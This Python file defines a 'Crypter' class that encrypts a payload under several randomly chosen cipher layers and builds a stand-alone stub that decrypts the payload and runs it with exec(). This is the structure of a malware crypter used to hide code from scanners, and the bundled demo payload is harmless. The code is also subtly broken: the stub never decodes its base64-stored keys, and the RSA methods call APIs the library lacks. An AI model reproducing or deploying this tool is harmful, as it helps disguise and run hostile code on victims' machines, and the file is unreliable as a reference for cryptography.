import os
import sys
import base64
import zlib
import hashlib
import random
import string
import struct
import marshal
from Crypto.Cipher import AES
from Crypto.Cipher import DES
from Crypto.Cipher import DES3
from Crypto.Cipher import Blowfish
from Crypto.Cipher import ARC4
from Crypto.Cipher import ChaCha20
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import secrets

class Crypter:
    def __init__(self, config=None):
        self.config = config or {}
        self.key = None
        self.iv = None
        self.salt = None
        
    def generate_key(self, key_size=32):
        return get_random_bytes(key_size)
    
    def generate_iv(self, iv_size=16):
        return get_random_bytes(iv_size)
    
    def generate_salt(self, salt_size=16):
        return get_random_bytes(salt_size)
    
    def derive_key_from_password(self, password, salt=None):
        if salt is None:
            salt = self.generate_salt()
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        
        key = kdf.derive(password.encode() if isinstance(password, str) else password)
        return key, salt
    
    def aes_encrypt(self, data, key=None, iv=None):
        try:
            if key is None:
                key = self.key or self.generate_key()
            if iv is None:
                iv = self.iv or self.generate_iv()
            
            if isinstance(data, str):
                data = data.encode()
            
            cipher = AES.new(key, AES.MODE_CBC, iv)
            padded_data = pad(data, AES.block_size)
            encrypted = cipher.encrypt(padded_data)
            
            return {
                "encrypted": encrypted,
                "key": key,
                "iv": iv
            }
        except Exception as e:
            return None
    
    def aes_decrypt(self, encrypted_data, key, iv):
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted_data)
            unpadded = unpad(decrypted, AES.block_size)
            return unpadded
        except:
            return None
    
    def aes_gcm_encrypt(self, data, key=None, iv=None):
        try:
            if key is None:
                key = self.key or self.generate_key()
            if iv is None:
                iv = self.generate_iv(12)
            
            if isinstance(data, str):
                data = data.encode()
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            encrypted, tag = cipher.encrypt_and_digest(data)
            
            return {
                "encrypted": encrypted,
                "tag": tag,
                "key": key,
                "iv": iv
            }
        except:
            return None
    
    def aes_gcm_decrypt(self, encrypted_data, key, iv, tag):
        try:
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            decrypted = cipher.decrypt_and_verify(encrypted_data, tag)
            return decrypted
        except:
            return None
    
    def xor_encrypt(self, data, key):
        try:
            if isinstance(data, str):
                data = data.encode()
            if isinstance(key, str):
                key = key.encode()
            
            key_length = len(key)
            encrypted = bytes([data[i] ^ key[i % key_length] for i in range(len(data))])
            return encrypted
        except:
            return None
    
    def xor_decrypt(self, encrypted_data, key):
        return self.xor_encrypt(encrypted_data, key)
    
    def rc4_encrypt(self, data, key=None):
        try:
            if key is None:
                key = self.key or self.generate_key(16)
            
            if isinstance(data, str):
                data = data.encode()
            
            cipher = ARC4.new(key)
            encrypted = cipher.encrypt(data)
            
            return {
                "encrypted": encrypted,
                "key": key
            }
        except:
            return None
    
    def rc4_decrypt(self, encrypted_data, key):
        try:
            cipher = ARC4.new(key)
            decrypted = cipher.decrypt(encrypted_data)
            return decrypted
        except:
            return None
    
    def des3_encrypt(self, data, key=None, iv=None):
        try:
            if key is None:
                key = self.generate_key(24)
            if iv is None:
                iv = self.generate_iv(8)
            
            if isinstance(data, str):
                data = data.encode()
            
            cipher = DES3.new(key, DES3.MODE_CBC, iv)
            padded_data = pad(data, DES3.block_size)
            encrypted = cipher.encrypt(padded_data)
            
            return {
                "encrypted": encrypted,
                "key": key,
                "iv": iv
            }
        except:
            return None
    
    def des3_decrypt(self, encrypted_data, key, iv):
        try:
            cipher = DES3.new(key, DES3.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted_data)
            unpadded = unpad(decrypted, DES3.block_size)
            return unpadded
        except:
            return None
    
    def blowfish_encrypt(self, data, key=None, iv=None):
        try:
            if key is None:
                key = self.generate_key(16)
            if iv is None:
                iv = self.generate_iv(8)
            
            if isinstance(data, str):
                data = data.encode()
            
            cipher = Blowfish.new(key, Blowfish.MODE_CBC, iv)
            padded_data = pad(data, Blowfish.block_size)
            encrypted = cipher.encrypt(padded_data)
            
            return {
                "encrypted": encrypted,
                "key": key,
                "iv": iv
            }
        except:
            return None
    
    def blowfish_decrypt(self, encrypted_data, key, iv):
        try:
            cipher = Blowfish.new(key, Blowfish.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted_data)
            unpadded = unpad(decrypted, Blowfish.block_size)
            return unpadded
        except:
            return None
    
    def chacha20_encrypt(self, data, key=None):
        try:
            if key is None:
                key = self.generate_key(32)
            
            if isinstance(data, str):
                data = data.encode()
            
            nonce = get_random_bytes(12)
            cipher = ChaCha20.new(key=key, nonce=nonce)
            encrypted = cipher.encrypt(data)
            
            return {
                "encrypted": encrypted,
                "key": key,
                "nonce": nonce
            }
        except:
            return None
    
    def chacha20_decrypt(self, encrypted_data, key, nonce):
        try:
            cipher = ChaCha20.new(key=key, nonce=nonce)
            decrypted = cipher.decrypt(encrypted_data)
            return decrypted
        except:
            return None
    
    def fernet_encrypt(self, data, key=None):
        try:
            if key is None:
                key = Fernet.generate_key()
            
            if isinstance(data, str):
                data = data.encode()
            
            cipher = Fernet(key)
            encrypted = cipher.encrypt(data)
            
            return {
                "encrypted": encrypted,
                "key": key
            }
        except:
            return None
    
    def fernet_decrypt(self, encrypted_data, key):
        try:
            cipher = Fernet(key)
            decrypted = cipher.decrypt(encrypted_data)
            return decrypted
        except:
            return None
    
    def rsa_generate_keys(self, key_size=2048):
        try:
            key = RSA.generate(key_size)
            private_key = key.export_key()
            public_key = key.publickey().export_key()
            
            return {
                "private_key": private_key,
                "public_key": public_key
            }
        except:
            return None
    
    def rsa_encrypt(self, data, public_key):
        try:
            key = RSA.import_key(public_key)
            
            if isinstance(data, str):
                data = data.encode()
            
            encrypted = key.encrypt(data, None)[0]
            return encrypted
        except:
            return None
    
    def rsa_decrypt(self, encrypted_data, private_key):
        try:
            key = RSA.import_key(private_key)
            decrypted = key.decrypt(encrypted_data)
            return decrypted
        except:
            return None
    
    def multi_layer_encrypt(self, data, layers=3):
        try:
            if isinstance(data, str):
                data = data.encode()
            
            keys = []
            encrypted_data = data
            
            for i in range(layers):
                # Choose random encryption method
                method = random.choice(['aes', 'xor', 'rc4', 'blowfish'])
                
                if method == 'aes':
                    result = self.aes_encrypt(encrypted_data)
                    encrypted_data = result["encrypted"]
                    keys.append({"method": "aes", "key": result["key"], "iv": result["iv"]})
                
                elif method == 'xor':
                    key = self.generate_key(16)
                    encrypted_data = self.xor_encrypt(encrypted_data, key)
                    keys.append({"method": "xor", "key": key})
                
                elif method == 'rc4':
                    result = self.rc4_encrypt(encrypted_data)
                    encrypted_data = result["encrypted"]
                    keys.append({"method": "rc4", "key": result["key"]})
                
                elif method == 'blowfish':
                    result = self.blowfish_encrypt(encrypted_data)
                    encrypted_data = result["encrypted"]
                    keys.append({"method": "blowfish", "key": result["key"], "iv": result["iv"]})
            
            return {
                "encrypted": encrypted_data,
                "keys": keys
            }
        except:
            return None
    
    def multi_layer_decrypt(self, encrypted_data, keys):
        try:
            decrypted_data = encrypted_data
            
            for key_info in reversed(keys):
                method = key_info["method"]
                
                if method == 'aes':
                    decrypted_data = self.aes_decrypt(decrypted_data, key_info["key"], key_info["iv"])
                
                elif method == 'xor':
                    decrypted_data = self.xor_decrypt(decrypted_data, key_info["key"])
                
                elif method == 'rc4':
                    decrypted_data = self.rc4_decrypt(decrypted_data, key_info["key"])
                
                elif method == 'blowfish':
                    decrypted_data = self.blowfish_decrypt(decrypted_data, key_info["key"], key_info["iv"])
                
                if decrypted_data is None:
                    return None
            
            return decrypted_data
        except:
            return None
    
    def encode_payload(self, data, encoding='base64'):
        try:
            if isinstance(data, str):
                data = data.encode()
            
            if encoding == 'base64':
                return base64.b64encode(data).decode()
            elif encoding == 'base64_url':
                return base64.urlsafe_b64encode(data).decode()
            elif encoding == 'hex':
                return data.hex()
            elif encoding == 'zlib':
                return base64.b64encode(zlib.compress(data)).decode()
            elif encoding == 'marshal':
                return base64.b64encode(marshal.dumps(data)).decode()
            else:
                return base64.b64encode(data).decode()
        except:
            return None
    
    def decode_payload(self, data, encoding='base64'):
        try:
            if encoding == 'base64':
                return base64.b64decode(data.encode())
            elif encoding == 'base64_url':
                return base64.urlsafe_b64decode(data.encode())
            elif encoding == 'hex':
                return bytes.fromhex(data)
            elif encoding == 'zlib':
                return zlib.decompress(base64.b64decode(data.encode()))
            elif encoding == 'marshal':
                return marshal.loads(base64.b64decode(data.encode()))
            else:
                return base64.b64decode(data.encode())
        except:
            return None
    
    def generate_payload_stub(self, encrypted_data, keys, encoding='base64'):
        stub = '''
import base64
import zlib
import marshal
from Crypto.Cipher import AES, DES3, Blowfish, ARC4
from Crypto.Util.Padding import unpad
import os
import sys

ENCRYPTED_DATA = "{encrypted_data}"
KEYS = {keys}
ENCODING = "{encoding}"

def decrypt_data():
    try:
        # Decode
        if ENCODING == 'base64':
            data = base64.b64decode(ENCRYPTED_DATA.encode())
        elif ENCODING == 'hex':
            data = bytes.fromhex(ENCRYPTED_DATA)
        elif ENCODING == 'zlib':
            data = zlib.decompress(base64.b64decode(ENCRYPTED_DATA.encode()))
        elif ENCODING == 'marshal':
            data = marshal.loads(base64.b64decode(ENCRYPTED_DATA.encode()))
        else:
            data = base64.b64decode(ENCRYPTED_DATA.encode())
        
        # Decrypt layers
        for key_info in reversed(KEYS):
            method = key_info["method"]
            
            if method == 'aes':
                cipher = AES.new(key_info["key"], AES.MODE_CBC, key_info["iv"])
                data = unpad(cipher.decrypt(data), AES.block_size)
            
            elif method == 'xor':
                key = key_info["key"]
                data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
            
            elif method == 'rc4':
                cipher = ARC4.new(key_info["key"])
                data = cipher.decrypt(data)
            
            elif method == 'blowfish':
                cipher = Blowfish.new(key_info["key"], Blowfish.MODE_CBC, key_info["iv"])
                data = unpad(cipher.decrypt(data), Blowfish.block_size)
        
        return data
    except:
        return None

def execute_payload(data):
    try:
        if isinstance(data, bytes):
            data = data.decode()
        exec(data)
    except:
        pass

def main():
    payload = decrypt_data()
    if payload:
        execute_payload(payload)

if __name__ == "__main__":
    main()
'''
        
        # Convert keys to string representation
        keys_str = []
        for key_info in keys:
            key_dict = {}
            for k, v in key_info.items():
                if isinstance(v, bytes):
                    key_dict[k] = base64.b64encode(v).decode()
                else:
                    key_dict[k] = v
            keys_str.append(key_dict)
        
        return stub.format(
            encrypted_data=self.encode_payload(encrypted_data, encoding),
            keys=repr(keys_str),
            encoding=encoding
        )
    
    def crypt_and_build_stub(self, payload, encoding='base64'):
        try:
            result = self.multi_layer_encrypt(payload, layers=3)
            
            if result is None:
                return None
            
            stub = self.generate_payload_stub(
                result["encrypted"],
                result["keys"],
                encoding
            )
            
            return stub
        except:
            return None

if __name__ == "__main__":
    crypter = Crypter()
    
    # Example usage
    test_payload = "print('Hello World')"
    
    # Encrypt with multiple layers
    result = crypter.multi_layer_encrypt(test_payload, layers=3)
    print(f"Encrypted: {result['encrypted'][:50]}...")
    
    # Decrypt
    decrypted = crypter.multi_layer_decrypt(result['encrypted'], result['keys'])
    print(f"Decrypted: {decrypted}")